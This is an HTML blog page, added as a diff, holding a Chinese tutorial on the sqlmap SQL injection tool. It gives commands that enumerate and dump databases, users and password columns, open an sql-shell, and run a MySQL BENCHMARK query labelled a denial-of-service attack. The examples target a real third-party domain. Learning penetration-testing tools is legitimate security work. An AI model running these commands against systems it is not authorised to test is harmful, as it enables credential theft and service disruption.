@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        SQL注入工具之SQLMAP - 一筐萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>一筐萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap"><span class="toc-text">sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍"><span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。在我看来，它是一个SQL注入的神器。"><span class="toc-text">SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。在我看来，它是一个SQL注入的神器。</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#当给sqlmap这么一个url的时候，它会："><span class="toc-text">当给sqlmap这么一个url的时候，它会：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap支持五种不同的注入模式："><span class="toc-text">sqlmap支持五种不同的注入模式：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap支持的数据库有："><span class="toc-text">sqlmap支持的数据库有：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用法一-一般注入"><span class="toc-text">用法一 (一般注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#测试能否注入"><span class="toc-text">测试能否注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#列出当前使用的数据库"><span class="toc-text">列出当前使用的数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#列出所有的数据库名字"><span class="toc-text">列出所有的数据库名字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#列出当前的用户"><span class="toc-text">列出当前的用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#列出所有的用户"><span class="toc-text">列出所有的用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#列出数据库的账户与密码"><span class="toc-text">列出数据库的账户与密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#列出指定数据库中的所有的表"><span class="toc-text">列出指定数据库中的所有的表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#列出指定数据库中的指定的表中的所有字段"><span class="toc-text">列出指定数据库中的指定的表中的所有字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#列出指定数据库中的指定的表中的指定的列中的内容"><span class="toc-text">列出指定数据库中的指定的表中的指定的列中的内容</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#–start：指定开始的行-–stop：指定结束的行"><span class="toc-text">–start：指定开始的行     –stop：指定结束的行</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用法二-用于mysql中DDOS攻击"><span class="toc-text">用法二(用于mysql中DDOS攻击)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取一个Shell"><span class="toc-text">获取一个Shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#输入执行语句完成DDOS攻击"><span class="toc-text">输入执行语句完成DDOS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#MySQL有一个内置的BENCHMARK-函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数只是简单地返回服务器执行表达式的时间，而不会涉及分析和优化的开销。"><span class="toc-text">MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数只是简单地返回服务器执行表达式的时间，而不会涉及分析和优化的开销。</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用法三-POST注入"><span class="toc-text">用法三(POST注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#首先用burp-suite进行抓包，将抓到的包保存到本地"><span class="toc-text">首先用burp suite进行抓包，将抓到的包保存到本地</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#后续的步骤同上"><span class="toc-text">后续的步骤同上</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        SQL注入工具之SQLMAP
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2018-06-15 16:30:50</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#工具" title="工具">工具</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <p>sql注入的一把梭</p>
+<a id="more"></a>
+<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h5 id="SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。在我看来，它是一个SQL注入的神器。"><a href="#SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。在我看来，它是一个SQL注入的神器。" class="headerlink" title="SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。在我看来，它是一个SQL注入的神器。"></a>SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。在我看来，它是一个SQL注入的神器。</h5><h4 id="当给sqlmap这么一个url的时候，它会："><a href="#当给sqlmap这么一个url的时候，它会：" class="headerlink" title="当给sqlmap这么一个url的时候，它会："></a>当给sqlmap这么一个url的时候，它会：</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、判断可注入的参数</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、判断可以用那种SQL注入技术来注入</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、识别出哪种数据库</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、根据用户选择，读取哪些数据</span><br></pre></td></tr></table></figure>
+
+<h4 id="sqlmap支持五种不同的注入模式："><a href="#sqlmap支持五种不同的注入模式：" class="headerlink" title="sqlmap支持五种不同的注入模式："></a>sqlmap支持五种不同的注入模式：</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、联合查询注入，可以使用<span class="class"><span class="keyword">union</span>的情况下的注入。</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、堆查询注入，可以同时执行多条语句的执行时的注入。</span><br></pre></td></tr></table></figure>
+
+<h4 id="sqlmap支持的数据库有："><a href="#sqlmap支持的数据库有：" class="headerlink" title="sqlmap支持的数据库有："></a>sqlmap支持的数据库有：</h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft <span class="keyword">Access</span>, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</span><br></pre></td></tr></table></figure>
+
+<h2 id="用法一-一般注入"><a href="#用法一-一般注入" class="headerlink" title="用法一 (一般注入)"></a>用法一 (一般注入)</h2><h4 id="测试能否注入"><a href="#测试能否注入" class="headerlink" title="测试能否注入"></a>测试能否注入</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.baidu.com"</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="列出当前使用的数据库"><a href="#列出当前使用的数据库" class="headerlink" title="列出当前使用的数据库"></a>列出当前使用的数据库</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.baidu.com"</span> --current -db</span><br></pre></td></tr></table></figure>
+
+<h4 id="列出所有的数据库名字"><a href="#列出所有的数据库名字" class="headerlink" title="列出所有的数据库名字"></a>列出所有的数据库名字</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.baidu.com"</span> --dbs</span><br></pre></td></tr></table></figure>
+
+<h4 id="列出当前的用户"><a href="#列出当前的用户" class="headerlink" title="列出当前的用户"></a>列出当前的用户</h4><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">"http://www.baidu.com"</span> --<span class="literal">current</span> -<span class="literal">user</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="列出所有的用户"><a href="#列出所有的用户" class="headerlink" title="列出所有的用户"></a>列出所有的用户</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.baidu.com"</span> --users</span><br></pre></td></tr></table></figure>
+
+<h4 id="列出数据库的账户与密码"><a href="#列出数据库的账户与密码" class="headerlink" title="列出数据库的账户与密码"></a>列出数据库的账户与密码</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.baidu.com"</span> --passwords</span><br></pre></td></tr></table></figure>
+
+<h4 id="列出指定数据库中的所有的表"><a href="#列出指定数据库中的所有的表" class="headerlink" title="列出指定数据库中的所有的表"></a>列出指定数据库中的所有的表</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.baidu.com"</span> -D db_name --tables</span><br></pre></td></tr></table></figure>
+
+<h4 id="列出指定数据库中的指定的表中的所有字段"><a href="#列出指定数据库中的指定的表中的所有字段" class="headerlink" title="列出指定数据库中的指定的表中的所有字段"></a>列出指定数据库中的指定的表中的所有字段</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.baidu.com"</span> -D db_name -T table_name --<span class="attribute">columns</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="列出指定数据库中的指定的表中的指定的列中的内容"><a href="#列出指定数据库中的指定的表中的指定的列中的内容" class="headerlink" title="列出指定数据库中的指定的表中的指定的列中的内容"></a>列出指定数据库中的指定的表中的指定的列中的内容</h4><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">"http://www.baidu.com"</span> -<span class="keyword">D</span> db_name -T table_name -<span class="keyword">C</span> <span class="string">"id,username,password"</span> --dump</span><br></pre></td></tr></table></figure>
+
+<h6 id="–start：指定开始的行-–stop：指定结束的行"><a href="#–start：指定开始的行-–stop：指定结束的行" class="headerlink" title="–start：指定开始的行     –stop：指定结束的行"></a>–start：指定开始的行     –stop：指定结束的行</h6><h2 id="用法二-用于mysql中DDOS攻击"><a href="#用法二-用于mysql中DDOS攻击" class="headerlink" title="用法二(用于mysql中DDOS攻击)"></a>用法二(用于mysql中DDOS攻击)</h2><h4 id="获取一个Shell"><a href="#获取一个Shell" class="headerlink" title="获取一个Shell"></a>获取一个Shell</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">"http://www.baidu.com"</span> --sql -<span class="keyword">shell</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="输入执行语句完成DDOS攻击"><a href="#输入执行语句完成DDOS攻击" class="headerlink" title="输入执行语句完成DDOS攻击"></a>输入执行语句完成DDOS攻击</h4><h6 id="MySQL有一个内置的BENCHMARK-函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数只是简单地返回服务器执行表达式的时间，而不会涉及分析和优化的开销。"><a href="#MySQL有一个内置的BENCHMARK-函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数只是简单地返回服务器执行表达式的时间，而不会涉及分析和优化的开销。" class="headerlink" title="MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数只是简单地返回服务器执行表达式的时间，而不会涉及分析和优化的开销。"></a>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数只是简单地返回服务器执行表达式的时间，而不会涉及分析和优化的开销。</h6><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark(<span class="number">99999999999</span>,<span class="number">0x70726f62616e646f70726f62616e646f70726f62616e646f</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="用法三-POST注入"><a href="#用法三-POST注入" class="headerlink" title="用法三(POST注入)"></a>用法三(POST注入)</h2><h4 id="首先用burp-suite进行抓包，将抓到的包保存到本地"><a href="#首先用burp-suite进行抓包，将抓到的包保存到本地" class="headerlink" title="首先用burp suite进行抓包，将抓到的包保存到本地"></a>首先用burp suite进行抓包，将抓到的包保存到本地</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap<span class="selector-class">.py</span> -r <span class="string">"d:\1.txt"</span> --dbs</span><br></pre></td></tr></table></figure>
+
+<h4 id="后续的步骤同上"><a href="#后续的步骤同上" class="headerlink" title="后续的步骤同上"></a>后续的步骤同上</h4>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href=“https://luobuming.github.io”>一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
